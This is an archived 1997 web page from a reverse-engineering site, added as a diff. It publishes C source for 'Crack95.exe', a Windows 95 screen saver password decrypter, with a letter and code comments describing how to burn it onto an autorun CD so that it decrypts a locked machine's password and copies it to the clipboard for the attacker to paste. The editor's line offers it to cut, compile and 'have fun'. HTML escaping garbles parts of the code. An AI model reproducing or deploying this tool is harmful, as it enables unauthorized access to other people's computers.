@@ -1,0 +1,439 @@
+<HTML>
+
+<HEAD><TITLE>heatmiz1.htm</TITLE></HEAD>
+
+<BODY BGCOLOR="#C0C0C0" TEXT="#001010" VLINK="#405040">
+
+<CENTER><FONT size="+3">Win 95 Screen Saver password decrypter </FONT>
+
+<BR>(C code for corporate survival)<BR><BR><H4>by Heatmizer<BR>
+
+<BR>
+
+(13 November 1997)</H4>
+
+<HR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALIGN="BOTTOM" BORDER="0" VSPACE="0" HSPACE="0" WIDTH="13" HEIGHT="13">Courtesy of fravia's page 
+
+of reverse engineering<BR>
+
+<BR><I>Well, an interesting add-on for the rather neglected &quot;corporate survival&quot; page. The trick explained by Heatmizer can, of course, find other interesting application 
+
+modalities...</I></CENTER><HR size="6">
+
+
+
+<PRE>
+
+Hey there,
+
+
+
+I really enjoy the site and have learned a lot from it.  It's one of the
+
+most valuable pages that I know.  Anyway, I thought I'd send this along
+
+because you might want to add it to your &quot;Corporate Survival&quot; section of
+
+the page.
+
+
+
+Basically, it's just a Win 95 Screen Saver password decrypter.  The
+
+decryption scheme comes from an issue of 2600 in an article by rdpzza.
+
+This is commented in the code.  The original decryption scheme was
+
+sparse (because it was just the decrypt code) and in ASM.  The included
+
+program is a nice C program that will output in Win 95.  The best thing
+
+is that if you create a file called autorun.inf and put these two lines
+
+in it:
+
+
+
+[autorun]
+
+open=crack95.exe
+
+
+
+Then, burn a CD with both files and put it in someone's machine, the
+
+program will decrypt the password and copy it to the clipboard. So, all
+
+you have to do is press CRTL-V and paste it into the password dialog box
+
+and you're in.  Also, if the person's machine isn't currently in screen
+
+saver mode, you can just run the executable and the password will be
+
+shown to you.
+
+
+
+I know this isn't an essay but I thought I'd send it to you in case you
+
+want to put it up since it fits pretty nicely into the &quot;Corporate
+
+Survival&quot; section.  Anyway, thanks again for the page.  Keep up the
+
+great work.  You have definitely got a great attitude towards learning.
+
+
+
+Later,
+
+Heatmizer</PRE>
+
+<HR><I>And here it is: just cut and paste and compile and have fun</I><HR>
+
+</PRE><XMP>
+
+
+
+/*************************************/
+
+/* Crack95.exe by Heatmizer          */
+
+/* Decryption specs from and article */
+
+/*      written by rdpzza in         */
+
+/*      2600 (The Hacker Quarterly)  */
+
+/*      vol. 13 No. 4                */
+
+/*                                   */
+
+/* Nov/97                            */
+
+/* Use this program in conjunction   */
+
+/* with the autorun function of      */
+
+/* Win 95.  Burn a CD with this file */
+
+/* and a file called autorun.inf     */
+
+/* which contains two lines:         */
+
+/* [autorun]                         */
+
+/* open=crack95.exe                  */
+
+/*                                   */
+
+/* Burn both of these files on the   */
+
+/* root of the CD-ROM.  Put it in    */
+
+/* a machine, wait until the CD-ROM  */
+
+/* light turns off, and then CTRL-V  */
+
+/* to paste the password on the      */
+
+/* dialog box.  You're in!           */
+
+/*************************************/
+
+
+
+#include <STDIO.h>
+
+#include <IO.h>
+
+#include <STRING.h>
+
+#include <MALLOC.h>
+
+#include <WINDOWS.h>
+
+#include <REGSTR.h>
+
+
+
+#define MAXLINE 32 /* This is how many characters to read in at once */
+
+
+
+/* Function Declarations */
+
+void *clip_wopen(void);
+
+int clip_write(void *pClip, unsigned int Format, void *pSrc, int DataSize);
+
+int clip_wclose(void *pClip);
+
+char *getregistry();
+
+//unsigned long findtoken();
+
+void parse_command (int, char **);
+
+
+
+/* Variable Declarations */
+
+char *filename;
+
+char *datavalue=0;
+
+char outputstring[100];
+
+char password[15]=&quot;              &quot;;
+
+char ec1,ec2;
+
+void *clip;
+
+int done=0;
+
+int counter=0;
+
+int keyvalue[14]={0x48,0xEE,0x76,0x1D,0x67,0x69,0xA1,0x1B,0x7A,0x8C,0x47,0xF8,0x54,0x95};
+
+
+
+void main(int ac, char *av[])
+
+{
+
+    parse_command (ac,av);          /* parse the command line */
+
+
+
+    datavalue=getregistry();        /* read password data from registry */
+
+
+
+    /* perform decryption */
+
+    while (!done)
+
+    {
+
+        if ((datavalue[counter]==0)||(counter&gt;26))
+
+        {
+
+                password[counter&gt;&gt;1]='\0';
+
+                done=1;
+
+                break;
+
+        }
+
+        else
+
+        {
+
+                ec1=datavalue[counter];
+
+                ec2=datavalue[counter+1];
+
+                if (ec2&gt;0x40)
+
+                ec2 -=0x07;
+
+                if (ec1&gt;0x40)
+
+                ec1 -=0x07;
+
+                ec1 &amp;=0x0f;             // mask higher bits
+
+                ec2 &amp;=0x0f;
+
+                ec1 <4; // shift first encrypted couplet left 4 bits ec1 +="ec2;" // add both couplets ec1 ^="keyvalue[counter">&gt;1];     // XOR with key value
+
+                password[counter&gt;&gt;1]=ec1;
+
+                counter +=2;    // do next couplet
+
+        }
+
+    }
+
+    sprintf(outputstring,&quot;Crack95.exe by Heatmizer\nDecryption specs by rdpzza\n\nWin 95 Screen Saver Password = %s&quot;,password);
+
+    MessageBox(NULL,outputstring,&quot;Crack95&quot;,MB_OK);
+
+
+
+    /* copy results to clipboard */
+
+    clip=clip_wopen();
+
+    clip_write(clip,CF_TEXT,password,strlen(password));
+
+    clip_wclose(clip);
+
+}     /* end of main */
+
+
+
+/****************************************************
+
+ *			FUNCTIONS								*
+
+ ****************************************************/
+
+ 
+
+/*-------------------------------------------------*
+
+ * This function reads the binary data from the	   *
+
+ * registry key:                                   *                                * 
+
+ * (HKEY_CURRENT_USER\Control Panel\desktop        *
+
+ *-------------------------------------------------*/
+
+
+
+char *getregistry()
+
+{
+
+	int err;
+
+	int err2;
+
+	HKEY hKey;
+
+	char *path=&quot;Control Panel\\desktop&quot;;
+
+	char *name=&quot;ScreenSave_Data&quot;;
+
+	char buffvalue[MAXLINE+1];        
+
+	DWORD bufferlen;
+
+	char *bufferptr=0;
+
+	
+
+	err=RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_ALL_ACCESS, &amp;hKey);
+
+	if (!err)
+
+	{
+
+		bufferlen = MAXLINE+1;
+
+		err2=RegQueryValueEx(hKey, name, 0, 0, buffvalue, &amp;bufferlen);
+
+		RegCloseKey(hKey);
+
+	}
+
+	bufferptr = buffvalue;
+
+	return(bufferptr);
+
+}	
+
+	
+
+/*-------------------------------------------------*
+
+ * This function parses the command line	   *
+
+ *-------------------------------------------------*/
+
+
+
+void parse_command (int ac, char *av[])
+
+{
+
+    int i;
+
+    char *p;
+
+
+
+    if (ac &gt; 2)
+
+    {
+
+        printf (&quot;\nUsage is CRACK95 [filename]\n&quot;);
+
+	exit (1);
+
+    }
+
+
+
+    for (i=1;i<AC;i++){ if (strchr(av[i], ' ')) { p="malloc" (strlen(av[i])+3); sprintf (p, "\"%s\"",av[i]); av[i]="p;" } } if (ac="=2)" filename="av[1];" else filename="c:\\windows\\user.dat" ; } /* Clipboard functions */ void *clip_wopen(void) { int ok="0;" if (OpenClipboard(NULL)) { if (EmptyClipboard()) { ok="1;" } } return((void *)ok); } int clip_write(void *gClip, unsigned int Format, void *pSrc, int DataSize) { HGLOBAL hData; void *pDst; int ok="0;" if (gClip) { hData="GlobalAlloc(GHND" | GMEM_SHARE, DataSize); // note freed by clipboard itself if (hData) { pDst="GlobalLock(hData);" if (pDst) { memcpy(pDst, pSrc, DataSize); GlobalUnlock(hData); if (SetClipboardData(Format, hData)) ok="1;" } } } return(ok); } int clip_wclose(void *gClip) { int ok="0;" if (gClip) { ok="CloseClipboard();" } return(ok); }</xmp><HR>
+
+Heatmizer 1997
+
+<FONT color="green">(c) Heatmizer 1997. All rights reversed</FONT>
+
+<HR ALIGN="CENTER" WIDTH="100%" SIZE="3">
+
+<CENTER><I>You are deep inside fravia's page of reverse engineering,  
+
+choose your way out:</I></CENTER>
+
+<BR><CENTER>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="corporate.htm" tppabs="http://www.anticrack.de/fravia/corporate.htm">Back to the corporate survival page</A><HR width="33%">
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="index.html" tppabs="http://www.anticrack.de/fravia/index.html">homepage</A>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="links.htm" tppabs="http://www.anticrack.de/fravia/links.htm">links</A> 
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="noanon.htm" tppabs="http://www.anticrack.de/fravia/noanon.htm">anonymity</A> 
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALIGN="BOTTOM" BORDER="0" VSPACE="0" HSPACE="0" WIDTH="13" HEIGHT="13"><A HREF="orc.htm" tppabs="http://www.anticrack.de/fravia/orc.htm">+ORC</A>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="student.htm" tppabs="http://www.anticrack.de/fravia/student.htm">students' essays</A>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="academy.htm" tppabs="http://www.anticrack.de/fravia/academy.htm">academy database</A><BR>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="tools.htm" tppabs="http://www.anticrack.de/fravia/tools.htm">tools</A>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="progcor.htm" tppabs="http://www.anticrack.de/fravia/progcor.htm">protectionist's corner</A><BR>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="cocktail.htm" tppabs="http://www.anticrack.de/fravia/cocktail.htm">cocktails</A>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="ideale.htm" tppabs="http://www.anticrack.de/fravia/ideale.htm">antismut CGI-scripts</A>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="searengi.htm" tppabs="http://www.anticrack.de/fravia/searengi.htm">search_forms</A>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="info.htm" tppabs="http://www.anticrack.de/fravia/info.htm">mail_fravia</A><BR>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" HEIGHT="13" BORDER="0" VSPACE="0" HSPACE="0"><A HREF="legal.htm" tppabs="http://www.anticrack.de/fravia/legal.htm">Is reverse engineering legal?</A></CENTER>
+
+<CENTER><HR ALIGN="CENTER" WIDTH="100%" SIZE="2"></CENTER>
+
+</BODY>
+
+</HTML>
